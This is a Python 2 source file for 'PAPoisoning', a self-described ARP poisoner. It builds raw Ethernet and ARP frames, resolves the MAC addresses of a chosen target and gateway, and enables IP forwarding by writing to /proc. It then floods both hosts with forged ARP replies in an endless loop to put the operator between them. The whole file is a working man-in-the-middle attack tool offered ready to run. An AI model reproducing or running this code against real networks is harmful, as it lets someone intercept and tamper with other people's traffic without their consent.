#! /usr/bin/python

import platform
import sys
import os

from termcolor import colored

# First of all, we need to make sure that the PAPoisoning runs on the linux operating system
if "Linux" not in platform.platform():
    print colored("[ERROR]>", "red", attrs=["bold"]), colored("Sorry, PAPoisoning only work on linux platform.", "white", attrs=["bold"])
    sys.exit()

# Make sure tha the PAPoisoning is executed in root mode
if os.getuid() != 0:
    print colored("[ERROR]>", "red", attrs=["bold"]), colored("Sorry, You must run me in root permission.", "white", attrs=["bold"])
    sys.exit()


# Import the requirements
import subprocess
import netifaces
import binascii
import socket
import struct


# Clear terminal
def Clear_display():
    subprocess.call("clear", shell=True)
    Display()



# Banner
def Display():
    print colored("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@", "red", attrs=["bold"])
    print colored("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@", "yellow", attrs=["bold"])
    print colored("@@@@@@@@@@ @@@@@@@@@@@@@@@@@ @@@@@@@@@@", "red", attrs=["bold"])
    print colored("@@@@@@@@@ @@@@@@@@@@@@@@@@@@@ @@@@@@@@@", "yellow", attrs=["bold"])
    print colored("@@@@@@@@@ .@@@@@       @@@@@. @@@@@@@@@", "red", attrs=["bold"])
    print colored("@@@@@@@@@  @   @@@@@@@@@   @  @@@@@@@@@", "yellow", attrs=["bold"])
    print colored("@@@@@@@@@   ,@@@@@@@@@@@@@,   @@@@@@@@@", "red", attrs=["bold"])
    print colored("@@@@@@@       @@@@@@@@@@@       @@@@@@@", "yellow", attrs=["bold"]), colored("[PAPoisoning]\t:", "magenta", attrs=["bold"]), colored("Is A Python ARP Poisoner", "white", attrs=["bold"])
    print colored("@@@                                 @@@", "red", attrs=["bold"]), colored("[Coded-by]\t:", "magenta", attrs=["bold"]), colored("Sha2ow_M4st3r", "white", attrs=["bold"])
    print colored("@   @@@@  @@@&           &@@@  @@@@   @", "yellow", attrs=["bold"]), colored("[Contact]\t:", "magenta", attrs=["bold"]), colored("Sha2ow@protonmail.com", "white", attrs=["bold"])
    print colored("  @@@@@@  @@@@@@       @@@@@@  @@@@@@  ", "red", attrs=["bold"]), colored("[Github]\t:", "magenta", attrs=["bold"]), colored("https://github.com/Sha2ow-M4st3r", "white", attrs=["bold"])
    print colored(" @@@@@@@  @@@@@@@     @@@@@@@  @@@@@@@ ", "yellow", attrs=["bold"]), colored("[Python-version]:", "magenta", attrs=["bold"]), colored("2.7", "white", attrs=["bold"])
    print colored("@@@@@@@@@  @@@@@@@   @@@@@@@  @@@@@@@@@", "red", attrs=["bold"]), colored("[Always says]\t:", "magenta", attrs=["bold"]), colored("You Can't Run From Your Shadow. But You Can Invite It To Dance", "white", attrs=["bold"])
    print colored("@@@@@@@@@@   @@@@@   @@@@@   @@@@@@@@@@", "yellow", attrs=["bold"])
    print colored("@@@@@@@@@@@@    @@   @@    @@@@@@@@@@@@", "red", attrs=["bold"])
    print colored("@@@@@@@@@@@@@@@@       @@@@@@@@@@@@@@@@", "yellow", attrs=["bold"])
    print colored("@@@@@@@@@@@@@@@(  @@@  (@@@@@@@@@@@@@@@", "red", attrs=["bold"])
    print colored("@@@@@@@@@@@@@  ,@@@@@@@,  @@@@@@@@@@@@@", "yellow", attrs=["bold"])
    print colored("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@", "red", attrs=["bold"])
    print "\n"



# Create a raw socket
def Raw_socket():
    global RST
    try:
        # AF_PACKET : Thats basically packet level. (Only linux can support it)
        # 0x0806    : Means ARP Packet
        RST = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    except socket.error as MSG:
        print colored("[ERROR]>", "red", attrs=["bold"]), colored("Socket creation: " + str(MSG), "white", attrs=["bold"])
        sys.exit()



# PAPoisoning
def PAPoisoning():
    global Interfaces

    # Find interfaces
    if os.path.isdir("/sys/class/net") == True:
        Interfaces = os.listdir("/sys/class/net")
        print colored("[PAPoisoning]>", "green", attrs=["bold"]), colored("Interfaces have been detected: " + str(Interfaces), "white", attrs=["bold"])

        User_data = Getting_info()
        # Extracting user data
        IFace = User_data[0]
        Target = User_data[1]
        Gateway = User_data[2]

        # Find the IP and MAC address of interface
        Addr = netifaces.ifaddresses(IFace)
        IFaceMAC = Addr[netifaces.AF_LINK][0]['addr'].encode("UTF-8")
        IFaceIPv4 = Addr[netifaces.AF_INET][0]['addr'].encode("UTF-8")

        # Find the target and gateway MAC address with ARP packet
        # Create ethernet frame for arp packet encapsulation
        EthernetFrame = Ethernet(IFaceMAC)
        # 0x001 --> 1 (Request)
        OpCode = "\x00\x01"
        # The MAC address of the destination for the ARP protocol should be : 00:00:00:00:00:00 (Broadcast)
        DestinationMAC = "00:00:00:00:00:00"
        ARPFrame = ARP(OpCode, DestinationMAC, IFaceMAC, Target, IFaceIPv4, EthernetFrame)
        PacketResponse = SendAndReceive(ARPFrame, IFace)
        TargetMAC = ""

        # Translate MAC Address to human readable
        for C in range(0, len(PacketResponse) - 1, 2):
            TargetMAC += PacketResponse[C:C+2] + ":"
        
        ARPFrame = ARP(OpCode, DestinationMAC, IFaceMAC, Gateway, IFaceIPv4, EthernetFrame)
        PacketResponse = SendAndReceive(ARPFrame, IFace)
        GatewayMac = ""

        # Translate MAC Address to human readable
        for C in range(0, len(PacketResponse) - 1, 2):
            GatewayMac += PacketResponse[C:C+2] + ":"
        
        try:
            subprocess.call('echo "1" > /proc/sys/net/ipv4/ip_forward', shell=True)
            print colored("[PAPoisoning]>", "red", attrs=["bold"]), colored("IPv4 redirection:", "white", attrs=["bold"]), colored("Success", "green", attrs=["bold"])
        except:
            print colored("[PAPoisoning]>", "red", attrs=["bold"]), colored("IPv4 redirection:", "white", attrs=["bold"]), colored("Failed", "red", attrs=["bold"])
        
        # Create poisoned arp packet
        # 2 - Reply
        OpCode = "\x00\x02"
        PoisonedPacketForTarget = ARP(OpCode, TargetMAC[:17], IFaceMAC, Target, Gateway, EthernetFrame)
        PoisonedPacketForGateway = ARP(OpCode, GatewayMac[:17], IFaceMAC, Gateway, Target, EthernetFrame)

        Poisonner(PoisonedPacketForTarget, PoisonedPacketForGateway, IFace)

    else:
        print colored("[ERROR]>", "red", attrs=["bold"]), colored("Can't find any interface.", "white", attrs=["bold"])
        sys.exit()



# Getting data from user
def Getting_info():
    try:
        Values = []
        Iface = raw_input(colored("[IFACE]> ", "white", attrs=["bold"]))
        if Iface not in Interfaces or Iface == "" or Iface == " ":
            print colored("[PAPoisoning]>", "red", attrs=["bold"]), colored("Not valid interface.", "white", attrs=["bold"])
            sys.exit()

        Target_addr = raw_input(colored("[TARGET]> ", "white", attrs=["bold"]))
        if Target_addr == "" or Target_addr == " " or len(Target_addr) > 15:
            print colored("[PAPoisoning]>", "red", attrs=["bold"]), colored("Not valid ip address.", "white", attrs=["bold"])
            sys.exit()

        Gateway_addr = raw_input(colored("[GATEWAY]> ", "white", attrs=["bold"]))
        if Gateway_addr == "" or Gateway_addr == " " or len(Gateway_addr) > 15:
            print colored("[PAPoisoning]>", "red", attrs=["bold"]), colored("Not valid ip address.", "white", attrs=["bold"])
            sys.exit()
        
        Values.append(Iface)
        Values.append(Target_addr)
        Values.append(Gateway_addr)

        return Values
    except KeyboardInterrupt:
        print colored("\n[PAPoisoning]>", "red", attrs=["bold"]), colored("Script stopped. (CTRL+C)", "white", attrs=["bold"])
        sys.exit()



# Ethernet frame
def Ethernet(IFaceMAC):
    # Translate MAC Address to machine readable
    SourceMAC = binascii.unhexlify(IFaceMAC.replace(":", ""))
    # The MAC address of the destination for the ARP protocol should be : FF:FF:FF:FF:FF:FF (Broadcast)
    DestinationMAC = "\xff\xff\xff\xff\xff\xff"
    # ARP Protocol : 0x0806
    EtherType = "\x08\x06"

    EthernetFrame = DestinationMAC + SourceMAC + EtherType
    return EthernetFrame



# ARP frame
def ARP(OpCode, DSTMac, SRCMac, DSTIp, SRCIp, EthernetFrame):
    HardwareType = "\x00\x01"        # ---> 1 (Ethernet)
    ProtocolType = "\x08\x00"        # ---> 8 (IPv4)
    HardwareAddressLength = "\x06"   # ---> 6 
    ProtocolAddressLength = "\x04"   # ---> 4
    Opcode = OpCode                  # ---> 1 (Request) 2 (Reply)
    DestinationMac = binascii.unhexlify(DSTMac.replace(":", ""))
    SourceMAC = binascii.unhexlify(SRCMac.replace(":", ""))
    DestinationIP = socket.inet_aton(DSTIp)
    SourceIP = socket.inet_aton(SRCIp)

    ARPFrame = HardwareType + ProtocolType + HardwareAddressLength + ProtocolAddressLength + Opcode + SourceMAC + SourceIP + DestinationMac + DestinationIP
    Packet = EthernetFrame+ ARPFrame

    return Packet



# Send And Receive
def SendAndReceive(ARPFrame, IFace):
    # Sending
    RST.bind((IFace, 0))

    try:
        RST.send(ARPFrame)
        Response = RST.recvfrom(65565)
        if not Response:
            print colored("[PAPoisoning]>", "red", attrs=["bold"]), colored("Can't recv packet. Check the Target and Gateway.", "white", attrs=["bold"])
            sys.exit()
        else:
            Packet= Response[0]
    except socket.error as MSG:
        print colored("[ERROR]>", "red", attrs=["bold"]), colored("Socket error: " + str(MSG), "white", attrs=["bold"])

    # Extraction
    # Ethernet : 14-Byte
    # ARP      : 28-Byte 
    ARPHeader = Packet[14:42]
    ARPUnpack = struct.unpack("!HHBBH6s4s6s4s", ARPHeader)
    MAC = ARPUnpack[5].encode("hex")
    return MAC



# Starting plan
def Poisonner(PoisonedPacketForTarget, PoisonedPacketForGateway, IFace):
    Counter = 0
    print colored("[PAPoisoning]>", "red", attrs=["bold"]), colored("The poisoning operation has begun... (Do not stop the script)", "white", attrs=["bold"])
    RST.bind((IFace, 0))

    try:
        while True:
            print colored("[PAPoisoning]>", "red", attrs=["bold"]), colored("Number of packets sent:", "white", attrs=["bold"]), colored(Counter, "white", attrs=["bold"])
            RST.send(PoisonedPacketForTarget)
            RST.send(PoisonedPacketForGateway)
            Counter += 1
    except KeyboardInterrupt:
        print colored("\n[PAPoisoning]>", "red", attrs=["bold"]), colored("Script stopped. (CTRL+C)", "white", attrs=["bold"])
        sys.exit()



# Using all functions
def Main():
    Clear_display()
    Raw_socket()
    PAPoisoning()


Main()